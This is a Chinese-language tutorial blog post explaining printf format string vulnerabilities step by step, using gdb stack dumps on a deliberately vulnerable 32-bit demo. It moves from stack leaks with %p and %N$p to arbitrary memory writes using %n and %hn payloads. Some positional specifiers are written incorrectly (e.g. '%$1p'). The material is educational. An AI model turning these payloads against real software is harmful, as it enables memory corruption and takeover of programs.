---
layout: post
title: 一步一步从栈的视角看格式化字符串漏洞
category: system/format_string
date: 2023-8-21 20:15:36
---

从栈的角度看格式化字符串漏洞

[toc]

# 一步一步看格式化字符串漏洞

## step1:  初探printf

格式化字符串漏洞实际上是`printf`函数的使用不当产生的。首先来看一个正常的`printf`函数：

```c
int price = 9;
char clothes[] = "shirt";
printf("The price of the %s is %d.\n", clothes, price);
```

可以看到其`printf`函数由两部分组成，其一是要输出的字符串，而后面是字符串中要解析的参数，在上述例子中为`clothes`和`price`。

那么`printf`函数是如何对其进行解析的？我们使用`gdb`来跟进看看。将上述代码补全，使用`gcc format.c -g -m32 -o format`编译为`32`位程序，将断点下到`call printf`处，如下所示：

```
 ► 0x56556240 <main+83>     call   printf@plt                    <printf@plt>
        format: 0x56557008 ◂— 'The price of the %s is %d.\n'
        vararg: 0xffffd046 ◂— 'shirt'
```

此时，我们使用命令`stack 0x10`，查看栈如下：

```assembly
pwndbg> stack 0x10
00:0000│ esp 0xffffd030 —▸ 0x56557008 ◂— 'The price of the %s is %d.\n'
01:0004│     0xffffd034 —▸ 0xffffd046 ◂— 'shirt'
02:0008│     0xffffd038 ◂— 9 /* '\t' */
03:000c│     0xffffd03c —▸ 0x56556208 (main+27) ◂— add eax, 0x2dcc
04:0010│     0xffffd040 ◂— 9 /* '\t' */
05:0014│     0xffffd044 ◂— 0x6873d104
06:0018│     0xffffd048 ◂— 0x747269 /* 'irt' */
07:001c│     0xffffd04c ◂— 0xa3ffc00
08:0020│     0xffffd050 —▸ 0xffffd070 ◂— 0x1
09:0024│     0xffffd054 ◂— 0x0
0a:0028│ ebp 0xffffd058 ◂— 0x0
0b:002c│     0xffffd05c —▸ 0xf7de4ee5 (__libc_start_main+245) ◂— add esp, 0x10
0c:0030│     0xffffd060 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
0d:0034│     0xffffd064 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
0e:0038│     0xffffd068 ◂— 0x0
0f:003c│     0xffffd06c —▸ 0xf7de4ee5 (__libc_start_main+245) ◂— add esp, 0x10
pwndbg> 
```

我们知道`32`位程序中，函数的参数是存储在栈上的。从栈上可以看到，`printf`函数的第`0`个参数是要输出的字符串本身的地址；第`1`个参数是`shirt`字符串的地址，也就是`printf`要解析的第一个参数；第`2`个参数是9，也就是`printf`需要解析的第二个参数。因此我们可以知道，`printf`函数实际上是以第一个参数为字符串，并按照顺序将传入`printf`函数的其他的参数以字符串中`%`开头的形式进行解析。

## step2: printf函数的栈泄露

上面我们已经明白`printf`函数的解析过程。若`printf`函数利用不当，便可以使用其进行栈上数据的泄露，如下所示：

```c
char content[0x20];
read(0, content, 0x20);
printf(content);
```

上面这段代码中，`printf`函数只接受一个参数，而且该参数是从标准输入读取的，是可控的。若我们输入`%p%p`，可以看到如下结果：

```
ltfall@ubuntu:/pwn/myhow2heap/formatstring$ ./format 
%p%p
0xffffd02c0x20
```

可以看到其输出的结果为`0xffb33e3c0x20`，这明显不符合编写代码者的本意。使用`gdb`跟进，看看这里面发生了什么。

将断点下在`call printf`：

```
 ► 0x56556253 <main+70>    call   printf@plt                    <printf@plt>
        format: 0xffffd02c ◂— 0x70257025 ('%p%p')
        vararg: 0xffffd02c ◂— 0x70257025 ('%p%p')
```

此时使用命令`stack`，查看栈如下：

```
pwndbg> stack
00:0000│ esp     0xffffd010 —▸ 0xffffd02c ◂— 0x70257025 ('%p%p')
01:0004│         0xffffd014 —▸ 0xffffd02c ◂— 0x70257025 ('%p%p')
02:0008│         0xffffd018 ◂— 0x20 /* ' ' */
03:000c│         0xffffd01c —▸ 0x56556228 (main+27) ◂— add ebx, 0x2da8
04:0010│         0xffffd020 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
05:0014│         0xffffd024 —▸ 0xf7fe22f0 ◂— endbr32 
06:0018│         0xffffd028 ◂— 0x0
07:001c│ eax ecx 0xffffd02c ◂— 0x70257025 ('%p%p')
pwndbg> 
```

到这里我们便能够还原为什么`printf`会产生上面的输出了：**`printf`仍然把我们传入的数据当作字符串，并将栈上后面的数据以字符串中`%`开头的方式进行解析。**

这意味着，若我们输入的数据为`%p%p`时，它将会把栈上后面的数据当作传入函数的参数，并以`%p`的方式解析。例如，`printf`将栈上的`0xffffd014`处内容进行解析，并以十六进制格式输出存放在该栈处的值`0xffffd02c`，接下来再以同样的方式将`0xffffd018`处的值以`%p`的方式进行解析，输出`0x20`。因此，我们可以以这种方式泄露栈上的数据。

## step3: printf函数泄露栈上任意位置内容

上面我们给`printf`函数传入了`%p%p`，并以此泄露了栈上的两个数据。那很显然，若我要泄露栈上第`20`个数据，自然不可能传入`20`个`%p`。因此，我们可以使用`%$[x]p`的方式来泄露栈上指定位置的内容。其中，`[x]`是要泄露的第几个位置。如下所示，我们使用`read`传入数据`%2$p`，查看栈如下：

```
stack
00:0000│ esp     0xffffd010 —▸ 0xffffd02c ◂— 0x70243225 ('%2$p')  // 这是第0个参数
01:0004│         0xffffd014 —▸ 0xffffd02c ◂— 0x70243225 ('%2$p')  // 这是第1个参数
02:0008│         0xffffd018 ◂— 0x20 /* ' ' */                     // 这是第2个参数
03:000c│         0xffffd01c —▸ 0x56556228 (main+27) ◂— add ebx, 0x2da8        // 这是第3个参数
04:0010│         0xffffd020 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c // 这是第4个参数
05:0014│         0xffffd024 —▸ 0xf7fe22f0 ◂— endbr32                          // 这是第5个参数
06:0018│         0xffffd028 ◂— 0x0                                            // 这是第6个参数
07:001c│ eax ecx 0xffffd02c ◂— 0x70243225 ('%2$p')                            // 这是第7个参数
```

再单步调试一步，获得输出结果为：

```
0x20
```

从上面可以看待，当我们传入`printf`的数据为`%2$p`时，我们实际上可以输出传入`printf`函数的第`2`个参数，也就是栈上的`0x20`。以此类推，我们可以以`%7$p`的形式输出`0x70243225`。只需要更改`%`的输出形式，就可以将栈上内容以任意方式输出，例如`%5$p`可以将栈上第`5`个位置以十六进制形式输出，以`%6$s`可以将栈上第`6`个位置以字符串形式输出。

## step4: printf函数覆盖任意位置内存

通过上面的内容，我们已经得知如何泄露栈上的任意数据。实际上，`printf`函数同样可以完成写操作，而且是任意位置写。这是用到了`printf`函数的`%n`特性，它可以将已经输出的字符数量写到某个地址上。如下所示：

```c
int count1 = 0, count2 = 0;
int occupied = 0;
printf("1234%n%20c%n\n", &count1, occupied, &count2);
printf("The value of counts comes to %d and %d.\n", count1, count2);
```

在上面这段代码中，第一个`printf`首先会输出`1234`，然后会遇到第一个`%n`，而此时输出的字符数量为`4`，因此`count1`的值将会被写为4。

然后其会遇到`%20c`，我们知道这实际上是将`occupied`输出为长度为`20`的字符，因此目前相当于总共输出了`20+4=24`个字符。

然后会遇到最后一个`%n`，由于目前已经输出了`24`个字符，因此`count2`会被赋值为`24`。

因此，上面这段代码的输出如下：

```c
$ ./format 
1234                   
The value of counts comes to 4 and 24.
```

那么，对于一个不规范的`printf`函数，我们可以利用`%n`来覆盖任意位置的内存，以这段代码为例：

```c
char content[0x20];
memset(content, 0, 0x20);

char* secret = (char*)malloc(0x10);
memset(secret, 0, 0x10);
printf("The address of secret is %p.\n", secret);

read(0, content, 0x20);
printf(content);
printf("The value of secret comes to 0x%x.\n", (size_t)*(size_t*)secret);
```

这段代码中，我们可以任意控制`printf`函数的参数。我们的目标是覆盖`secret`指向的堆块的值，若我们成功，即可说明我们完成了任意内存覆盖。

同样是下断点到`call printf`（`printf(content)`的那个`printf`）,我们先随便输入一点，比如`%p%p`，查看栈如下：

```
pwndbg> stack
00:0000│ esp     0xffffd010 —▸ 0xffffd02c ◂— '%p%p\n'
01:0004│         0xffffd014 —▸ 0xffffd02c ◂— '%p%p\n'
02:0008│         0xffffd018 ◂— 0x20 /* ' ' */
03:000c│         0xffffd01c —▸ 0x56556268 (main+27) ◂— add ebx, 0x2d60
04:0010│         0xffffd020 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
05:0014│         0xffffd024 —▸ 0xf7fe22f0 ◂— endbr32 
06:0018│         0xffffd028 —▸ 0x5655a1a0 ◂— 0x0
07:001c│ eax ecx 0xffffd02c ◂— '%p%p\n'
```

我们观察到，实际上我们输入的`%p%p`就存在于栈上，例如上面是在`0xffffd02c`。那么输入`%7$p`即可查看这个值，如下：

```
$ ./format 
The address of secret is 0x574791a0.
%7$p
0x70243725
The value of secret comes to 0x0.
```

`0x70243725`就是`%7$p`的十六进制形式，因此确实能够索引到这个值。那么，我们当然也可以用`%n`来向这个位置写值！

我们上面得知，我们输入的数据会放在栈上的第7个位置。因此，若我们输入以下数据：

```
p32(addr_of_secret) + "%7$n"
```

将断点下到`call printf`，查看栈如下:

```
pwndbg> stack 0x10
00:0000│ esp     0xffe03db0 —▸ 0xffe03dcc —▸ 0x56d3b1a0 ◂— 0x0
01:0004│         0xffe03db4 —▸ 0xffe03dcc —▸ 0x56d3b1a0 ◂— 0x0
02:0008│         0xffe03db8 ◂— 0x20 /* ' ' */
03:000c│         0xffe03dbc —▸ 0x5659d268 (main+27) ◂— add ebx, 0x2d60
04:0010│         0xffe03dc0 —▸ 0xf7f24000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
05:0014│         0xffe03dc4 —▸ 0xf7f562f0 ◂— endbr32 
06:0018│         0xffe03dc8 —▸ 0x56d3b1a0 ◂— 0x0
07:001c│ eax ecx 0xffe03dcc —▸ 0x56d3b1a0 ◂— 0x0  // 第7个参数
08:0020│         0xffe03dd0 ◂— '%7$n'             // 第8个参数
09:0024│         0xffe03dd4 ◂— 0x0
... ↓            5 skipped
0f:003c│         0xffe03dec ◂— 0xa407ee00
```

`printf`函数会先输出`p32(addr_of_secret)`，输出长度为4个字符。然后再解析`%7$n`，会将已经输出的字符数量写入栈上的第七个值处。而栈上第七个位置是`p32(addr_of_secret)`，因此会将`secret`指向的堆块的值写为`4`。

同样的，我们可以控制输出的长度，来使得`secret`指向的值为任意数值，例如我们发送以下数据：

```
p32(addr_of_secret) + "%20c%7$n"
```

在解析到`addr_of_secret`时，其已经输出了`p32(addr_of_secret)`四个字符加上`%20c`的二十个字符，因此会使得`secret`指向的值为`24`。

在某些情况，我们希望将整个`secret`的值覆盖为一个想要的值，我们可以使用如下方式来进行覆盖：

```
%hn  双字节覆盖
%hhn 单字节覆盖
```

使用以下方式，我们可以更便利地覆盖内存中的值。例如，一个完整的覆盖`secret`的值为`0x12345678`的`payload`如下：

```
p32(heap_leak) + p32(heap_leak + 2) + b'%22128c%7$hn' + b'%48060c%8$hn'
```

通过这个`payload`可以得到结果：

```
The value of secret comes to 0x12345678.
```

让我们来一一解析这个`payload`：

首先我们在栈上第`7`个和第`8`个位置分别布置了堆地址的低两位和高两位地址。

`printf`函数首先会输出这两个地址，长度为`8`个字节。

接下来`printf`函数会输出`%22128c`，加起来总共输出了`22136`个字符，对应十六进制数为`0x5678`

接下来`printf`函数会解析到`%7$hn`，会将已经输出的字符数量以两个字节的形式写入到栈上第七个位置，也就是将`0x5678`写到堆地址的低两位上。

接下来`printf`函数会解析到`%48060c`，会输出`48060`个字符，和之前`22136`加起来总共输出了`70196`个字符，对应十六进制数为`0x11234`。

接下来`printf`函数会解析到`%8$hn`，会将已经输出的字符数量以两个字节的形式写入到栈上第八个位置。而目前已经输出了`0x11234`个字符，因此取两个字节，会将`0x1234`写入到堆地址的高两位，从而完成了对堆内存空间的覆盖。

从上面这个过程我们得知，可以利用`%$hn`和`%$hhn`写指定数量字节的特性来对任意内存空间进行覆盖。

## 附: 64位下格式化字符串的变化

`64`位下最大的差别是：函数的前`6`个参数位于寄存器上，多余的参数才位于栈上。

而我们知道`64`位下的前`6`个参数分别为：`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`上。

`rdi`会保存字符串本身，因此`%$1p`将会泄露`rsi`的值，`%$2p`会泄露`rdx`的值。以此类推，栈上的第一个值为`%6$p`。

若你已经掌握`32`位下的格式化字符串利用，了解上述参数构造的不同后与`32`位下并无差别。



**参考链接**

[ctf-wiki](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)